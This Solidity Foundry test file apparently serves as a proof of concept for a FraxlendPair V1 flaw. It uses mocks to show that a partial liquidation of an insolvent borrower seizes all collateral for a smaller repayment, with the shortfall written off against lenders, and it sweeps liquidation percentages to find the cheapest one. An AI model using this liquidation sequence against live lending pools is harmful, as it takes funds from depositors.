// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/Test.sol";

import "./v1_verified/src__contracts__FraxlendPair.sol";
import "./v1_verified/@chainlink__contracts__src__v0.8__interfaces__AggregatorV3Interface.sol";
import "./v1_verified/src__contracts__interfaces__IRateCalculator.sol";
import "./v1_verified/src__contracts__interfaces__IFraxlendWhitelist.sol";

contract MockERC20V1 is ERC20 {
    uint8 internal immutable _decimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) {
        _decimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockChainlinkOracleV1 is AggregatorV3Interface {
    int256 public answer;
    uint8 public immutable _decimals;

    constructor(int256 initialAnswer, uint8 decimals_) {
        answer = initialAnswer;
        _decimals = decimals_;
    }

    function setAnswer(int256 newAnswer) external {
        answer = newAnswer;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function description() external pure returns (string memory) {
        return "MockChainlinkOracleV1";
    }

    function version() external pure returns (uint256) {
        return 1;
    }

    function getRoundData(uint80) external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, block.timestamp, block.timestamp, 1);
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, block.timestamp, block.timestamp, 1);
    }
}

contract MockRateCalculatorV1 is IRateCalculator {
    uint64 public immutable fixedRatePerSec;

    constructor(uint64 _ratePerSec) {
        fixedRatePerSec = _ratePerSec;
    }

    function name() external pure returns (string memory) {
        return "MockRateCalculatorV1";
    }

    function getConstants() external pure returns (bytes memory _calldata) {
        return bytes("");
    }

    function requireValidInitData(bytes calldata) external pure {}

    function getNewRate(bytes calldata, bytes calldata) external pure returns (uint64) {
        return uint64(1e12);
    }
}

contract MockWhitelistV1 is IFraxlendWhitelist {
    function owner() external view returns (address) {
        return address(this);
    }

    function oracleContractWhitelist(address) external pure returns (bool) {
        return true;
    }

    function rateContractWhitelist(address) external pure returns (bool) {
        return true;
    }

    function fraxlendDeployerWhitelist(address) external pure returns (bool) {
        return true;
    }

    function renounceOwnership() external {}

    function transferOwnership(address) external {}

    function setOracleContractWhitelist(address[] calldata, bool) external {}

    function setRateContractWhitelist(address[] calldata, bool) external {}

    function setFraxlendDeployerWhitelist(address[] calldata, bool) external {}
}

contract V1PartialLiquidationWriteoffTest is Test {
    MockERC20V1 asset;
    MockERC20V1 collateral;
    MockChainlinkOracleV1 oracle;
    MockRateCalculatorV1 rate;
    MockWhitelistV1 whitelist;
    FraxlendPair pair;

    address lender = address(0xA11CE);
    address borrower = address(0xB0B);

    function setUp() public {
        asset = new MockERC20V1("Frax", "FRAX", 18);
        collateral = new MockERC20V1("Wrapped Ether", "WETH", 18);

        // V1 exchange rate = 1e36 * oracleMultiply / oracleDivide / oracleNormalization.
        // Use oracleMultiply only and normalization 1e18, so answer=1e18 gives exchangeRate=1e36.
        // This is fine for initial solvency because borrower posts large collateral.
        oracle = new MockChainlinkOracleV1(1e18, 18);
        rate = new MockRateCalculatorV1(uint64(1e12));
        whitelist = new MockWhitelistV1();

        bytes memory configData = abi.encode(
            address(asset),
            address(collateral),
            address(oracle),
            address(0),
            uint256(1e36),
            address(rate),
            bytes("")
        );

        bytes memory immutables = abi.encode(
            address(this), // circuit breaker
            address(this), // comptroller
            address(this), // timelock
            address(whitelist)
        );

        pair = new FraxlendPair({
            _configData: configData,
            _immutables: immutables,
            _maxLTV: 75000,
            _liquidationFee: 10000,
            _maturityDate: 0,
            _penaltyRate: 0,
            _isBorrowerWhitelistActive: false,
            _isLenderWhitelistActive: false
        });

        address[] memory empty = new address[](0);
        pair.initialize("FraxlendV1 PoC", empty, empty, bytes(""));

        asset.mint(lender, 1_000_000e18);
        vm.startPrank(lender);
        asset.approve(address(pair), type(uint256).max);
        pair.deposit(1_000_000e18, lender);
        vm.stopPrank();

        collateral.mint(borrower, 10_000e18);
        vm.startPrank(borrower);
        collateral.approve(address(pair), type(uint256).max);

        // Borrow 1000 asset against 2000 collateral.
        pair.borrowAsset({
            _borrowAmount: 1_000e18,
            _collateralAmount: 2_000e18,
            _receiver: borrower
        });
        vm.stopPrank();
    }

    function _makeDeeplyInsolvent() internal {
        vm.warp(block.timestamp + 1000);
        pair.addInterest();

        // Raise collateral:asset exchange rate to make position deeply insolvent.
        oracle.setAnswer(3e18);
        pair.updateExchangeRate();
    }

    function test_POC_V1_findLowestPercentStillSeizesAllCollateral() public {
        uint256 bestPercent;
        uint256 bestRepay;
        uint256 bestWriteoff;

        for (uint256 percent = 10000; percent <= 100000; percent += 1000) {
            uint256 snap = vm.snapshot();

            _makeDeeplyInsolvent();

            (uint128 totalAssetBeforeRaw, ) = pair.totalAsset();
            uint256 totalAssetBefore = totalAssetBeforeRaw;

            (, uint256 borrowerShares, uint256 borrowerCollateralBefore) = pair.getUserSnapshot(borrower);
            uint256 sharesToLiquidate = (borrowerShares * percent) / 100000;
            uint256 repayNeeded = pair.toBorrowAmount(sharesToLiquidate, true);

            asset.mint(address(this), repayNeeded);
            asset.approve(address(pair), type(uint256).max);

            uint256 liqCollateralBefore = collateral.balanceOf(address(this));
            pair.liquidate(uint128(sharesToLiquidate), block.timestamp, borrower);
            uint256 collateralGain = collateral.balanceOf(address(this)) - liqCollateralBefore;

            (uint128 totalAssetAfterRaw, ) = pair.totalAsset();
            uint256 writeoff = totalAssetBefore > uint256(totalAssetAfterRaw)
                ? totalAssetBefore - uint256(totalAssetAfterRaw)
                : 0;

            if (collateralGain == borrowerCollateralBefore && writeoff > 0) {
                bestPercent = percent;
                bestRepay = repayNeeded;
                bestWriteoff = writeoff;
                vm.revertTo(snap);
                break;
            }

            vm.revertTo(snap);
        }

        emit log_named_uint("lowestPercentBpsStillSeizesAllCollateral", bestPercent);
        emit log_named_uint("repayNeededAtLowestPercent", bestRepay);
        emit log_named_uint("lenderWriteoffAtLowestPercent", bestWriteoff);

        assertGt(bestPercent, 0, "no partial all-collateral threshold found");
        assertLt(bestPercent, 100000, "only full liquidation seizes all collateral");
        assertGt(bestWriteoff, 0, "no lender writeoff at threshold");
    }


    function test_POC_V1_liquidationPercentSweep_sameCollateralSelectableWriteoff() public {
        uint256[8] memory percents = [
            uint256(100000),
            uint256(99000),
            uint256(95000),
            uint256(90000),
            uint256(75000),
            uint256(50000),
            uint256(25000),
            uint256(10000)
        ];

        for (uint256 i = 0; i < percents.length; i++) {
            uint256 snap = vm.snapshot();

            _makeDeeplyInsolvent();

            (uint128 totalAssetBeforeRaw, ) = pair.totalAsset();
            uint256 totalAssetBefore = totalAssetBeforeRaw;

            (, uint256 borrowerShares, uint256 borrowerCollateralBefore) = pair.getUserSnapshot(borrower);
            uint256 sharesToLiquidate = (borrowerShares * percents[i]) / 100000;
            uint256 repayNeeded = pair.toBorrowAmount(sharesToLiquidate, true);

            asset.mint(address(this), repayNeeded);
            asset.approve(address(pair), type(uint256).max);

            uint256 liqCollateralBefore = collateral.balanceOf(address(this));
            pair.liquidate(uint128(sharesToLiquidate), block.timestamp, borrower);
            uint256 collateralGain = collateral.balanceOf(address(this)) - liqCollateralBefore;

            (uint128 totalAssetAfterRaw, ) = pair.totalAsset();
            uint256 writeoff = totalAssetBefore > uint256(totalAssetAfterRaw)
                ? totalAssetBefore - uint256(totalAssetAfterRaw)
                : 0;

            (, uint256 sharesAfter, uint256 collateralAfter) = pair.getUserSnapshot(borrower);

            emit log_named_uint("percentBps", percents[i]);
            emit log_named_uint("sharesToLiquidate", sharesToLiquidate);
            emit log_named_uint("repayNeeded", repayNeeded);
            emit log_named_uint("borrowerCollateralBefore", borrowerCollateralBefore);
            emit log_named_uint("liquidatorCollateralGain", collateralGain);
            emit log_named_uint("lenderWriteoff", writeoff);
            emit log_named_uint("borrowerSharesAfter", sharesAfter);
            emit log_named_uint("borrowerCollateralAfter", collateralAfter);
            emit log("---");

            vm.revertTo(snap);
        }
    }


    function test_POC_V1_partialLiquidationSeizesAllCollateralAndShiftsDebtToLenders() public {
        _makeDeeplyInsolvent();

        uint256 snap = vm.snapshot();

        (, uint256 shares, ) = pair.getUserSnapshot(borrower);
        uint256 fullRepay = pair.toBorrowAmount(shares, true);

        (uint128 assetBeforeRaw, ) = pair.totalAsset();
        uint256 assetBefore = assetBeforeRaw;

        asset.mint(address(this), fullRepay);
        asset.approve(address(pair), type(uint256).max);

        uint256 colBefore = collateral.balanceOf(address(this));
        pair.liquidate(uint128(shares), block.timestamp, borrower);
        uint256 fullCollateralGain = collateral.balanceOf(address(this)) - colBefore;

        (uint128 assetAfterRaw, ) = pair.totalAsset();
        uint256 fullWriteoff = assetBefore > uint256(assetAfterRaw) ? assetBefore - uint256(assetAfterRaw) : 0;

        emit log_named_uint("v1_fullRepayNeeded", fullRepay);
        emit log_named_uint("v1_fullCollateralGain", fullCollateralGain);
        emit log_named_uint("v1_fullLenderWriteoff", fullWriteoff);

        vm.revertTo(snap);

        (, shares, ) = pair.getUserSnapshot(borrower);
        uint256 partialShares = (shares * 75_000) / 100_000;
        uint256 partialRepay = pair.toBorrowAmount(partialShares, true);

        (assetBeforeRaw, ) = pair.totalAsset();
        assetBefore = assetBeforeRaw;

        asset.mint(address(this), partialRepay);
        asset.approve(address(pair), type(uint256).max);

        colBefore = collateral.balanceOf(address(this));
        pair.liquidate(uint128(partialShares), block.timestamp, borrower);
        uint256 partialCollateralGain = collateral.balanceOf(address(this)) - colBefore;

        (assetAfterRaw, ) = pair.totalAsset();
        uint256 partialWriteoff = assetBefore > uint256(assetAfterRaw) ? assetBefore - uint256(assetAfterRaw) : 0;

        (, uint256 sharesAfter, uint256 collateralAfter) = pair.getUserSnapshot(borrower);

        uint256 repaySaved = fullRepay - partialRepay;

        emit log_named_uint("v1_partialShares", partialShares);
        emit log_named_uint("v1_partialRepayNeeded", partialRepay);
        emit log_named_uint("v1_partialCollateralGain", partialCollateralGain);
        emit log_named_uint("v1_partialLenderWriteoff", partialWriteoff);
        emit log_named_uint("v1_repaySavedByPartialLiquidation", repaySaved);
        emit log_named_uint("v1_borrowerSharesAfterPartial", sharesAfter);
        emit log_named_uint("v1_borrowerCollateralAfterPartial", collateralAfter);

        assertEq(partialCollateralGain, fullCollateralGain, "partial liquidation did not receive same collateral");
        assertLt(partialRepay, fullRepay, "partial liquidation did not pay less");
        assertEq(fullWriteoff, 0, "full liquidation unexpectedly wrote off lender assets");
        assertGt(partialWriteoff, 0, "partial liquidation did not shift residual debt to lenders");
        assertEq(repaySaved, partialWriteoff - fullWriteoff, "saved repayment not shifted to lenders");
        assertEq(sharesAfter, 0, "borrower shares not fully cleared");
        assertEq(collateralAfter, 0, "borrower collateral not fully seized");
    }

}
